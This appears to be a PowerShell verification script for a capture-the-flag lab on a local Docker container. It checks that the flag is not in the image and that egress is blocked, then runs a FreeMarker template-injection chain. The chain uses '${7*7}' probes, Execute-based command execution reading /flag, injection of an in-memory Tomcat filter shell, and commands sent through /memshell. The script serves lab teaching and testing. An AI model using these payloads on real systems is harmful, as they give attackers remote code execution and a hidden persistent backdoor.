# =============================================================================
# tests/verify_chain.ps1 - reproduces the whole acceptance run for
# labs/08-freemarker-memshell against an already-built image / running compose service.
#
# Everything here was actually executed; the output is pasted into README.md.
# =============================================================================
param(
  [string]$Port = "8098",
  [string]$Image = "ctf/freemarker-memshell:latest",
  [string]$Container = "freemarker-memshell",
  [string]$Flag = "flag{JAVA_MEMSHELL_VERIFY_2026}"
)
function Line($t) { Write-Host "`n===== $t =====" }
$base = "http://127.0.0.1:$Port"

Line "1. image: /flag must NOT be baked into any layer"
docker run --rm --entrypoint cat $Image /flag
Write-Host "exit=$LASTEXITCODE  (non-zero == flag is not in the image)"

Line "2. container: /flag exists (written by entrypoint.sh)"
docker exec $Container sh -c 'ls -l /flag; cat /flag; echo'

Line "3. /healthz"
$r = Invoke-WebRequest -Uri "$base/healthz" -UseBasicParsing
Write-Host "HTTP $($r.StatusCode) body=$($r.Content)"

Line "4. /api/lab-info"
$j = Invoke-RestMethod -Uri "$base/api/lab-info"
Write-Host ("id={0}`nno_egress={1}`nflag_path={2}`nlevels={3}" -f $j.id, $j.no_egress, $j.flag_path, (($j.levels | ForEach-Object { $_.id }) -join ','))

Line "5. no flag-readout endpoint"
foreach ($p in @('/flag', '/flag-readout', '/api/flag')) {
  try { $x = Invoke-WebRequest -Uri "$base$p" -UseBasicParsing; Write-Host "$p -> $($x.StatusCode)" }
  catch { Write-Host "$p -> $($_.Exception.Response.StatusCode.value__)" }
}

Line "6. egress really blocked (inside the container)"
docker exec $Container sh -c 'iptables -S OUTPUT'
Write-Host "--- 6a. outbound TCP to 1.1.1.1:80 (expect timeout/fail) ---"
docker exec $Container sh -c 'wget -T 5 -q -O- http://1.1.1.1/ ; echo "wget exit=$?"'
Write-Host "--- 6b. outbound TCP to 93.184.216.34:80 (expect timeout/fail) ---"
docker exec $Container sh -c 'wget -T 5 -q -O- http://93.184.216.34/ ; echo "wget exit=$?"'
Write-Host "--- 6c. DNS lookup (expect fail) ---"
docker exec $Container sh -c 'nslookup example.com 2>&1 | head -5; echo "nslookup exit=$?"'
Write-Host "--- 6d. published inbound port still answers ---"
$r = Invoke-WebRequest -Uri "$base/healthz" -UseBasicParsing
Write-Host "host -> $base/healthz : HTTP $($r.StatusCode) $($r.Content)"

Line "7. L1 - FreeMarker SSTI is present"
$tpl = '${7*7}'
$r = Invoke-WebRequest -Uri ("$base/theme/preview?template=" + [uri]::EscapeDataString($tpl)) -UseBasicParsing
Write-Host "template=$tpl -> $($r.Content.Trim())"

Line "8. L2 - arbitrary code execution (freemarker.template.utility.Execute)"
$tpl = '${"freemarker.template.utility.Execute"?new()("id")}'
$r = Invoke-WebRequest -Uri ("$base/theme/preview?template=" + [uri]::EscapeDataString($tpl)) -UseBasicParsing
Write-Host $r.Content.Trim()

Line "9. L2b - read /flag with the same primitive"
$tpl = '${"freemarker.template.utility.Execute"?new()("cat /flag")}'
$r = Invoke-WebRequest -Uri ("$base/theme/preview?template=" + [uri]::EscapeDataString($tpl)) -UseBasicParsing
Write-Host $r.Content.Trim()

Line "10. L3 - inject the in-memory Tomcat Filter"
$tpl = '${"com.lab.themepreview.memshell.InjectHelper"?new(servletContext)()}'
Write-Host "payload: $tpl"
$r = Invoke-WebRequest -Uri ("$base/theme/preview?template=" + [uri]::EscapeDataString($tpl)) -UseBasicParsing
Write-Host $r.Content.Trim()

Line "11. L4 - call the new in-memory endpoint"
$r = Invoke-WebRequest -Uri "$base/memshell?cmd=id" -UseBasicParsing
Write-Host $r.Content

Line "12. L4b - read /flag through the memory shell"
$r = Invoke-WebRequest -Uri ("$base/memshell?cmd=" + [uri]::EscapeDataString('cat /flag')) -UseBasicParsing
Write-Host $r.Content

Line "13. Thymeleaf entry point - what is actually reachable"
foreach ($t in @('aurora', '__${7*7}__')) {
  $u = "$base/theme/thymeleaf?theme=" + [uri]::EscapeDataString($t)
  try { $x = Invoke-WebRequest -Uri $u -UseBasicParsing; Write-Host "theme=$t -> HTTP $($x.StatusCode)" }
  catch {
    $resp = $_.Exception.Response; $sr = New-Object IO.StreamReader($resp.GetResponseStream()); $b = $sr.ReadToEnd()
    $m = [regex]::Match($b, 'Error resolving template \[(.*?)\]')
    Write-Host "theme=$t -> HTTP $($resp.StatusCode.value__) resolved=[$($m.Groups[1].Value)]  (未求值)"
  }
}

Line "14. memory shell survives only in memory"
Write-Host "-> /memshell exists now; restart the process and it is gone (that is the point)."
